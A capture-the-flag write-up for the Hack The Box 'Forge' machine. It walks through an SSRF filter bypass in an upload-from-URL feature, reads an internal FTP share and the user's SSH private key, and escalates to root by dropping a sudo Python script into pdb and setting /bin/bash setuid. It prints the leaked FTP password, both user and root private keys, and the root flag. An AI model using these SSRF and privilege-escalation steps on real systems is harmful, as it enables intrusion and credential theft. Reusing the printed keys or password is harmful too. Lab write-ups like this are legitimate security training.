@@ -1,0 +1,454 @@
+---
+title: Hackthebox Forge Writeup
+slug: hackthebox-forge-writeup
+description: Hackthebox release new machine called forge, in this machine we need to abuse a upload from url functionality to access a subdomain page and from there we got the creads for ftp user and we use that to see file inside ftp server and get id_rsa for user and for privexec we need to crash a python file and hop into pdb mode and get root shell.
+date: 2021-09-12
+image: hackthebox-forge-writeup.webp
+---
+
+import FixTheImageURL from '../../components/mdxComponents/FixTheImageURL.astro';
+import { components as MDXComponents } from '../../components/mdxComponents';
+export const components = MDXComponents;
+
+## Nmap
+
+```js
+┌───[us-free-1]─[10.10.14.61]─[root@parrot]─[~/Desktop/HTB/Forge]
+└──╼ [★]$ nmap -sC -sV -oA nmap/result 10.10.11.111
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-12 03:19 CDT
+Nmap scan report for 10.10.11.111
+Host is up (0.085s latency).
+Not shown: 997 closed ports
+PORT   STATE    SERVICE VERSION
+21/tcp filtered ftp
+22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
+|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
+|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
+80/tcp open     http    Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to http://forge.htb
+Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.62 seconds
+```
+
+There are three ports open `21:ftp(filtered),22:ssh,80:http`
+
+## Port-80
+
+When we go to the `ip` it will redirected to `forge.htb`
+
+<FixTheImageURL src='web.png' slug='hackthebox-forge-writeup' />
+
+Let's quickly add that in our `/etc/hosts` file.
+
+```js
+┌───[us-free-1]─[10.10.14.61]─[root@parrot]─[~/Desktop/HTB/Forge]
+└──╼ [★]$ cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       parrot
+
+#custom
+10.10.11.111    forge.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+```
+
+Now let's check what's `running` on the port `80`.
+
+It's a `simple` gallery page.
+
+<FixTheImageURL src='web1.png' slug='hackthebox-forge-writeup' />
+
+And when we go to `upload` an image page we can see that there is `two` options to `upload` file
+
+1. upload through `local` file
+2. upload through `url`
+
+<FixTheImageURL src='web2.png' slug='hackthebox-forge-writeup' />
+
+After some `hit` and try to upload php `rev` shell through changing `shell.php` to `shell.php.jpg` but that's didn't `work`.
+
+After that i try finding `sub-domain` with gobuster and i got `admin.forge.htb`
+
+```js
+┌───[us-free-1]─[10.10.14.61]─[root@parrot]─[~/Desktop/HTB/Forge]
+└──╼ [★]$ gobuster vhost -u http://forge.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -r
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:          http://forge.htb
+[+] Method:       GET
+[+] Threads:      50
+[+] Wordlist:     /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+[+] User Agent:   gobuster/3.1.0
+[+] Timeout:      10s
+===============================================================
+2021/09/12 03:26:55 Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: admin.forge.htb (Status: 200) [Size: 27]
+```
+
+After that i `quickly` add that in my `host` file.
+
+```js
+┌───[us-free-1]─[10.10.14.61]─[root@parrot]─[~/Desktop/HTB/Forge]
+└──╼ [★]$ cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       parrot
+
+#custom
+10.10.11.111    forge.htb admin.forge.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+```
+
+Now let's go to `admin.forge.htb`
+
+And we see only `localhost` is allowed.
+
+<FixTheImageURL src='web3.png' slug='hackthebox-forge-writeup' />
+
+After that i think we can `access` that admin page with upload from `url` functionality which we see in the `forge.htb/upload` page.
+
+For that let's `first` capture that req in `burp`.
+
+<FixTheImageURL src='web4.png' slug='hackthebox-forge-writeup' />
+
+And we can only use `http,https`.
+
+<FixTheImageURL src='burp.png' slug='hackthebox-forge-writeup' />
+
+So let's `first` try with `loopback` address.
+
+And we see it's a `blacklisted` address.
+
+<FixTheImageURL src='burp1.png' slug='hackthebox-forge-writeup' />
+
+After that let's `check` if we can access the `admin.forge.htb`
+
+And we see it's also a `blacklisted` address.
+
+<FixTheImageURL src='burp2.png' slug='hackthebox-forge-writeup' />
+
+Let's `capitalize` all letters of the `sub-domain` to check if it's `bypass` the filter.
+
+```js
+url=http://ADMIN.FORGE.HTB&remote=1
+```
+
+And we see we `successfully` bypass the filter and get the `link`.
+
+let's open that `link` and see what's inside that `admin` page.
+
+<FixTheImageURL src='burp3.png' slug='hackthebox-forge-writeup' />
+
+And we can see `firefox` can't open that so let's try with `curl`.
+
+<FixTheImageURL src='web5.png' slug='hackthebox-forge-writeup' />
+
+And we get the `html` souce code of the `admin` page.
+
+And there is an `/announcements` page let's take a `look` on that.
+
+<FixTheImageURL src='cmd.png' slug='hackthebox-forge-writeup' />
+
+```js
+┌───[us-free-1]─[10.10.14.61]─[root@parrot]─[~/Desktop/HTB/Forge]
+└──╼ [★]$ curl http://forge.htb/uploads/hpD9pJzjkTaU2WVmy7tW
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Admin Portal</title>
+</head>
+<body>
+    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
+    <header>
+            <nav>
+                <h1 className=""><a href="/">Portal home</a></h1>
+                <h1 className="align-right margin-right"><a href="/announcements">Announcements</a></h1>
+                <h1 className="align-right"><a href="/upload">Upload image</a></h1>
+            </nav>
+    </header>
+    <br><br><br><br>
+    <br><br><br><br>
+    <center><h1>Welcome Admins!</h1></center>
+</body>
+</html>
+```
+
+Now let's add `/announcements` in the req.
+
+```js
+url=http://ADMIN.FORGE.HTB/announcements&remote=1
+```
+
+<FixTheImageURL src='burp4.png' slug='hackthebox-forge-writeup' />
+
+Now let's `check` what's inside that page with `curl`.
+
+Boom we got the `ftp` creads and some `notes`
+
+But the `problem` is we can't login inside `ftp` with these creads because the ftp port is `filtered`.
+
+But the `notes` said they support `ftp,ftps,http,https` for uploading the file through `?u=` parameter.
+
+So we can use this `functionality` to login inside `ftp` server.
+
+<FixTheImageURL src='cmd1.png' slug='hackthebox-forge-writeup' />
+
+```js
+┌───[us-free-1]─[10.10.14.61]─[root@parrot]─[~/Desktop/HTB/Forge]
+└──╼ [★]$ curl http://forge.htb/uploads/GPpfUw16plRT0JZocTg8
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Announcements</title>
+</head>
+<body>
+    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
+    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
+    <header>
+            <nav>
+                <h1 className=""><a href="/">Portal home</a></h1>
+                <h1 className="align-right margin-right"><a href="/announcements">Announcements</a></h1>
+                <h1 className="align-right"><a href="/upload">Upload image</a></h1>
+            </nav>
+    </header>
+    <br><br><br>
+    <ul>
+        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
+        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
+        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
+    </ul>
+</body>
+</html>
+```
+
+Let's list the `directory` and files of `ftp` server.
+
+```js
+url=http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@127.1.1.1&remote=1
+```
+
+Got the `url`.
+
+<FixTheImageURL src='burp5.png' slug='hackthebox-forge-writeup' />
+
+It's `seems` like we are inside the `home` directory of user it's mean `.ssh` folder is also there let's `quickly` check it out.
+
+<FixTheImageURL src='cmd2.png' slug='hackthebox-forge-writeup' />
+
+Let's try to get the `id_rsa` of the user.
+
+```js
+url=http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@127.1.1.1/.ssh/id_rsa&remote=1
+```
+
+<FixTheImageURL src='burp6.png' slug='hackthebox-forge-writeup' />
+
+Got the `id_rsa` of the user.
+
+<FixTheImageURL src='cmd3.png' slug='hackthebox-forge-writeup' />
+
+## id_rsa
+
+```js
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+shlLupso7WoS0AAAAKdXNlckBmb3JnZQE=
+-----END OPENSSH PRIVATE KEY-----
+```
+
+Let's `ssh` in real quick and get the `user.txt`.
+
+<FixTheImageURL src='cmd4.png' slug='hackthebox-forge-writeup' />
+
+## Privilege escalation
+
+Before start with `LinPEAS` let's try some `manual` enumeration.
+
+And we see we can run `sudo` command without `password`.
+
+```js
+user@forge:~$ sudo -l
+Matching Defaults entries for user on forge:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+
+User user may run the following commands on forge:
+    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
+user@forge:~$
+```
+
+Let's check the `remote-manage.py` script.
+
+```js
+user@forge:~$ cat /opt/remote-manage.py
+#!/usr/bin/env python3
+import socket
+import random
+import subprocess
+import pdb
+
+port = random.randint(1025, 65535)
+
+try:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    sock.bind(('127.0.0.1', port))
+    sock.listen(1)
+    print(f'Listening on localhost:{port}')
+    (clientsock, addr) = sock.accept()
+    clientsock.send(b'Enter the secret passsword: ')
+    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
+        clientsock.send(b'Wrong password!\n')
+    else:
+        clientsock.send(b'Welcome admin!\n')
+        while True:
+            clientsock.send(b'\nWhat do you wanna do: \n')
+            clientsock.send(b'[1] View processes\n')
+            clientsock.send(b'[2] View free memory\n')
+            clientsock.send(b'[3] View listening sockets\n')
+            clientsock.send(b'[4] Quit\n')
+            option = int(clientsock.recv(1024).strip())
+            if option == 1:
+                clientsock.send(subprocess.getoutput('ps aux').encode())
+            elif option == 2:
+                clientsock.send(subprocess.getoutput('df').encode())
+            elif option == 3:
+                clientsock.send(subprocess.getoutput('ss -lnt').encode())
+            elif option == 4:
+                clientsock.send(b'Bye\n')
+                break
+except Exception as e:
+    print(e)
+    pdb.post_mortem(e.__traceback__)
+finally:
+    quit()
+```
+
+We can `clearly` see that if we manage to `create` some error so we go to the `except` handler inside `Python Debugger` and as we running it as `root` so we can easily `execute` command with `os` module in the system.
+
+For that we need to `ssh` connection one is for `start` the server and `second` is for connect to the `server`.
+
+```js
+user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
+```
+
+For create an `error` i use `'\` in my netcat you use `anything` you want.
+
+<FixTheImageURL src='cmd5.png' slug='hackthebox-forge-writeup' />
+
+Now we are `inside` the pdb let's `import` the os module and use our old `trick` for geeting `root`.
+
+```js
+user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
+Listening on localhost:31202
+invalid literal for int() with base 10: b"'\"
+> /opt/remote-manage.py(27)&#x3C;module>()
+-> option = int(clientsock.recv(1024).strip())
+(Pdb) import os
+(Pdb) os.system("ls /root")
+clean-uploads.sh  root.txt  snap
+0
+(Pdb) os.system("chmod +s /bin/bash")
+0
+(Pdb) exit()
+user@forge:~$ ls -la /bin/bash
+-rwsr-sr-x 1 root root 1183448 Jun 18  2020 /bin/bash
+user@forge:~$ /bin/bash -p
+bash-5.0# cd /root
+bash-5.0# cat root.txt
+6bbb84f76b9de4d37e8a7ed270691877
+```
+
+<FixTheImageURL src='cmd6.png' slug='hackthebox-forge-writeup' />
+
+Here is the `id_rsa` of root for those who only `wants` points.
+
+## id_rsa_root
+
+```js
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAusTE7uvvBLrfqDLv6I/+Xc9W/RVGA4eFPOowUNkHDZ4MTUm4cK4/
+DdTvY7o7bvSinEX26rWdG4eVY3qnBGSACl3VIGX80NsWgyZwWQT20Vj0q8gf674RB4LfB6
+i6Awm8cbm3105HxfQnqr4qr2oJEpyDVaF29zpaS+6y0Ogq7HcRkSyQyErBnGmlOYBcBvvh
+M+/j0iCCMfM6ZbZ/0ouoN4uOXzn+jh/ZJstDoEd0VH4RhnMzHA1hdo+6+OhFUbtoCFdxtP
+wfzVp0LQb2wqitREeT5GNPIVL2//tbNz+QUfuwQAEHCcveyKWDVTs/klDkcf/p9NqsAspn
+re6QhoLqzsuAXds0gThQLN+/+EUuV3sZ6wdkmHBqKbm8aaGc84P/SpnDvz249+G188NoUq
+nVSb9RCRnGy/JStP97umzhbyJLiRpRY8Dlh8Ugln6D58b5QVk3uYjP0muf+SI3No+L7+81
+iM7jNo9x2Jsg79tjP/RfgSJdTt6atSgeq9BwBJzxAAAFgPqA8Wj6gPFoAAAAB3NzaC1yc2
+EAAAGBALrExO7r7wS636gy7+iP/l3PVv0VRgOHhTzqMFDZBw2eDE1JuHCuPw3U72O6O270
+opxF9uq1nRuHlWN6pwRkgApd1SBl/NDbFoMmcFkE9tFY9KvIH+u+EQeC3weougMJvHG5t9
+dOR8X0J6q+Kq9qCRKcg1Whdvc6WkvustDoKux3EZEskMhKwZxppTmAXAb74TPv49IggjHz
+OmW2f9KLqDeLjl85/o4f2SbLQ6BHdFR+EYZzMxwNYXaPuvjoRVG7aAhXcbT8H81adC0G9s
+KorURHk+RjTyFS9v/7Wzc/kFH7sEABBwnL3silg1U7P5JQ5HH/6fTarALKZ63ukIaC6s7L
+gF3bNIE4UCzfv/hFLld7GesHZJhwaim5vGmhnPOD/0qZw789uPfhtfPDaFKp1Um/UQkZxs
+vyUrT/e7ps4W8iS4kaUWPA5YfFIJZ+g+fG+UFZN7mIz9Jrn/kiNzaPi+/vNYjO4zaPcdib
+IO/bYz/0X4EiXU7emrUoHqvQcASc8QAAAAMBAAEAAAGAR6rR1sx5/1qmECjbnmYCuYSiYK
+MVJq2OFv3WZG+jITqQhefP+o0ibPBUm/QOclk1PLosMYxXKQUx8eZSyIC4EUJIUhJQnOQ1
+E0ZgvggFnfeAi5pThWZ9qmAxrQK1vgyyXwFg5iGHsRIrVn16a61Ipfeg/e7jc6LUm2aQ/1
+DXh7145DgxpmnpOVfgqtvydEua8w8OYMdQrlIjCnypN+WXOxk2HJxobakS7qv42zwQC4wE
+tY7nAdCwoYotuO2IDADZFcRWiPImmTnVWQvM27VKzpuDmp1kmOh8VD1qFV0GlPQIsJMHLH
+rQYJ6toBi7WaHC7H56EDd9QrVJgmmj50I90weAj8fldN+L8VSl3PKBgzdsxUH9xB3toj1z
+uYvgk7cPxcW78ObYUkmNUJNMZcA0/LezoXG7fWuhRoOf1eXIbUKYd+ygNlyxaqywufESzY
+HaGezUEV+UsI0Ll3Me7WyslZaX6hpOjhYJmN3kv0dWNJg9Nkg29Pr4iU5q+t71BYlxAAAA
+wFWKwWX2ApTatPB/5GvAs3SWT+O3bj3FXoQ3VjI5D+vPyUCx9Dr/iMOBv5YHObfxwqezzD
+0m82Zy1gwvWUPpVq4uiRPwwojqAYqDwA/gbX3+LdVR0bZFMFx2R0FzVXEIMCI5Cxvg+DBx
+NsLIQ8EbEWGp9NWOa9FeRsA8o/KjzFEPU8MlxxgaFkzsxciykNGZk1luUSsNujm7fgWv55
+ZdFmti8b1TAt5cVkHrT5Fks835XX9W8exqcOcZlEHIXOSgLQAAAMEA9cceY3X6o9Nu6xPu
+3eREkMAjIaR+cY/OrKO40Zm0NiIvpi+kOVoNtau0gXSXNryMyuGsjGuWW8IPnpr21UBJP8
+1O4kfqXdsfj067n21kofcxS4Ca6cSi7m4HU6ZGGpiC9eSJ44XRNGypKhahpxhbZqgFFdVU
+MdzdsZRFhm1tdQU8ZoqouPAX+tI3788IBG2QAgTpQ9ly7sVKMdwfT9qC3wtcgXGS1OweaC
+BUDvWd2rzP7/egeGqGWFOYZFxKhndPAAAAwQDCiVwE7LiHyZHfHN7amzdusL9odhljHkYf
+2xeZP3PERvqWr3g8xwhgT4oGUy8x3zgILYYvnX04FpfpBMke725nEyrvK/kZf/Sgp7Sk0h
+pbEabGDypeS4A3UIhtaM+VShS7wJGz8sXAbMm+JSwMt67vN95IULw6+SuyirRLUDc77N76
+xIK6PSiF7Hs2Z7BZOVQd1BpblnZrL3mbJcdvXS8n55QgDuxfJeoxKrr9r1r/WqRjtce8/A
+ZPz43Mi1EOl78AAAAKcm9vdEBmb3JnZQE=
+-----END OPENSSH PRIVATE KEY-----
+```
